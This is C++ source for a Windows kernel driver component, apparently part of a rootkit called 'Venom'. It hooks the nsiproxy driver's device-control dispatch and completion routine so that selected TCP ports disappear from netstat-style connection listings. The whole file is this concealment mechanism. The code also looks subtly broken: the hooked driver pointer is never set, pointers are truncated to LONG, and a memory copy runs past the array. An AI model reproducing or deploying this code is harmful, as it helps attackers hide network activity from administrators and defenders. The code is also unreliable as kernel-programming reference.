#pragma warning( disable : 26451 4311 4302 )
#include "NetworkHandler.h"
#include "Venom.h"

PDRIVER_OBJECT NetworkHandler::pNsiDriverObject = nullptr;
PDRIVER_DISPATCH NetworkHandler::originalNsiDeviceIo = nullptr;
NetworkHandler::HIDDEN_PORTS NetworkHandler::HiddenPortsContext;

NTSTATUS NetworkHandler::hookNsi()
{
	NTSTATUS status;
	UNICODE_STRING nsiDriverName;


	RtlInitUnicodeString(&nsiDriverName, L"\\Driver\\nsiproxy");

	status = ObReferenceObjectByName(&nsiDriverName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, reinterpret_cast<PVOID*>(&originalNsiDeviceIo));

	if (!NT_SUCCESS(status))
	{
		KdPrint(("NetworkHandler: Failed to obtain nsiproxy object (0x%08X)\n", status));
		return STATUS_SUCCESS;

	}

	//Initialize hidden ports context
	HiddenPortsContext.Mutex.Init();
	HiddenPortsContext.HiddenPortsCount = 0;
	InitializeListHead(&HiddenPortsContext.HiddenPortsHead);


	//Save the original device control function of the nsiproxy driver
	originalNsiDeviceIo = pNsiDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL];

	//Perform IRP hook
	InterlockedExchange(reinterpret_cast<PLONG>(&(pNsiDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL])), reinterpret_cast<LONG>(hookedDeviceIoControl));

	return status;
}

NTSTATUS NetworkHandler::hookedDeviceIoControl(
	PDEVICE_OBJECT  DeviceObject,
	PIRP  Irp
)
{
	ULONG ioControlCode;
	PIO_STACK_LOCATION irpStack;
	NTSTATUS status;

	irpStack = IoGetCurrentIrpStackLocation(Irp);

	ioControlCode = irpStack->Parameters.DeviceIoControl.IoControlCode;

	if (IOCTL_NSI_GETALLPARAM == ioControlCode)
	{
		if (irpStack->Parameters.DeviceIoControl.InputBufferLength == sizeof(NSI_PARAM))
		{
			//If call is relevent, hook the CompletionRoutine.
			PHP_CONTEXT ctx = static_cast<HP_CONTEXT*>(ExAllocatePoolWithTag(NonPagedPool, sizeof(HP_CONTEXT), DRIVER_TAG));
			if (ctx == nullptr)
			{
				status = STATUS_INSUFFICIENT_RESOURCES;
				Irp->IoStatus.Status = status;
				Irp->IoStatus.Information = 0;
				IoCompleteRequest(Irp, IO_NO_INCREMENT);
				goto ERROR;
			}

			ctx->oldIocomplete = irpStack->CompletionRoutine;
			ctx->oldCtx = irpStack->Context;
			irpStack->CompletionRoutine = hookedCompletionRoutine;
			irpStack->Context = ctx;
			ctx->pcb = IoGetCurrentProcess();

			if ((irpStack->Control & SL_INVOKE_ON_SUCCESS) == SL_INVOKE_ON_SUCCESS)
				ctx->bShouldInvolve = TRUE;
			else
				ctx->bShouldInvolve = FALSE;
			irpStack->Control |= SL_INVOKE_ON_SUCCESS;
		}
	}

	//Call the original DeviceIoControl function.
	status = originalNsiDeviceIo(DeviceObject, Irp);

ERROR:
	return status;
}

NTSTATUS NetworkHandler::hookedCompletionRoutine(
	PDEVICE_OBJECT  DeviceObject,
	PIRP  Irp,
	PVOID  Context
)
{
	NTSTATUS status = STATUS_SUCCESS;
	PIO_STACK_LOCATION nextIrpLocation = IoGetNextIrpStackLocation(Irp);
	PHP_CONTEXT pContext = static_cast<PHP_CONTEXT>(Context);
	PNSI_PARAM nsiParam;
	int ConnectionIndex;

	if (NT_SUCCESS(Irp->IoStatus.Status))
	{

		nsiParam = static_cast<PNSI_PARAM>(Irp->UserBuffer);
		if (MmIsAddressValid(nsiParam->lpMem))
		{

			// netstat will involve internal calls which will use nsi_param structure.
			if ((nsiParam->UnknownParam8 == 0x38))
			{
				KAPC_STATE apcState;
				PNSI_STATUS_ENTRY pStatusEntry = static_cast<PNSI_STATUS_ENTRY>(nsiParam->lpStatus);
				PINTERNAL_TCP_TABLE_ENTRY pTcpEntry = static_cast<PINTERNAL_TCP_TABLE_ENTRY>(nsiParam->lpMem);
				int itemCount = nsiParam->TcpConnectionCount;

				KeStackAttachProcess(pContext->pcb, &apcState);

				//Make sure we are in the context of original process.
				for (ConnectionIndex = 0; ConnectionIndex < itemCount; ConnectionIndex++)
				{

					if (shouldHidePort(pTcpEntry[ConnectionIndex].localEntry.Port))
					{
						//NSI will map status array entry to tcp table array entry
						//we must modify both synchronously
						RtlCopyMemory(&pTcpEntry[ConnectionIndex], &pTcpEntry[ConnectionIndex + 1], sizeof(INTERNAL_TCP_TABLE_ENTRY) * (itemCount - ConnectionIndex));
						RtlCopyMemory(&pStatusEntry[ConnectionIndex], &pStatusEntry[ConnectionIndex + 1], sizeof(NSI_STATUS_ENTRY) * (itemCount - ConnectionIndex));
						itemCount--;
						nsiParam->TcpConnectionCount--;
						ConnectionIndex--;
					}
				}

				KeUnstackDetachProcess(&apcState);
			}
		}
	}

	nextIrpLocation->Context = pContext->oldCtx;
	nextIrpLocation->CompletionRoutine = pContext->oldIocomplete;


	if (pContext->bShouldInvolve)
	{
		status = nextIrpLocation->CompletionRoutine(DeviceObject, Irp, Context);
	}

	else if (Irp->PendingReturned)
	{
		IoMarkIrpPending(Irp);
	}

	//Free the fake context
	ExFreePool(Context);

	return status;
}


NTSTATUS NetworkHandler::unhookNsi() {

	//Undo hook
	InterlockedExchange(reinterpret_cast<PLONG>(&(pNsiDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL])), reinterpret_cast<LONG>(originalNsiDeviceIo));
	KdPrint(("NetworkHandler: original DeviceControl function restored.\n"));

	//Decrease reference count of hooked driver
	ObDereferenceObject(pNsiDriverObject);

	//Sleep after removing IRP hooks
	//to make sure all handlers are done
	LARGE_INTEGER wait_time;
	wait_time.QuadPart = -50 * 1000 * 1000;
	KeDelayExecutionThread(KernelMode, 0, &wait_time);

	//Free the hidden ports list
	cleanHiddenPorts();

	return STATUS_SUCCESS;
}

//TODO: Create a remove hidden port function because of the code replication between cleanHiddenPorts and addHiddenPort.
void NetworkHandler::cleanHiddenPorts() {
	// Free list
	while (!IsListEmpty(&HiddenPortsContext.HiddenPortsHead)) {
		auto entry = RemoveHeadList(&HiddenPortsContext.HiddenPortsHead);
		auto item = CONTAINING_RECORD(entry, HiddenPort, Entry);
		ExFreePool(item);
	}
}

void NetworkHandler::addHiddenPort(LIST_ENTRY* entry) {
	
	AutoLock<FastMutex> lock(HiddenPortsContext.Mutex);
	if (HiddenPortsContext.HiddenPortsCount > MAX_HIDDEN_PORTS) {
		// Too many items, remove oldest one
		auto head = RemoveHeadList(&HiddenPortsContext.HiddenPortsHead);
		HiddenPortsContext.HiddenPortsCount--;
		auto item = CONTAINING_RECORD(head, HiddenPort, Entry);
		ExFreePool(item);
	}
	InsertTailList(&HiddenPortsContext.HiddenPortsHead, entry);
	HiddenPortsContext.HiddenPortsCount++;
}

bool NetworkHandler::shouldHidePort(USHORT port) {

	AutoLock<FastMutex> lock(HiddenPortsContext.Mutex);
	if (HiddenPortsContext.HiddenPortsCount > 0)
	{
		PLIST_ENTRY temp = nullptr;
		temp = &HiddenPortsContext.HiddenPortsHead;
		temp = temp->Flink;

		while (&HiddenPortsContext.HiddenPortsHead != temp) {

			auto item = CONTAINING_RECORD(temp, HiddenPort, Entry);
			
			if (port == item->HiddenPort) {
				return true;
			}
			temp = temp->Flink;
		}
	}

	return false;
}

USHORT NetworkHandler::htons(USHORT a)
{
	USHORT b = a;
	b = (b << 8);
	a = (a >> 8);
	return (a | b);
}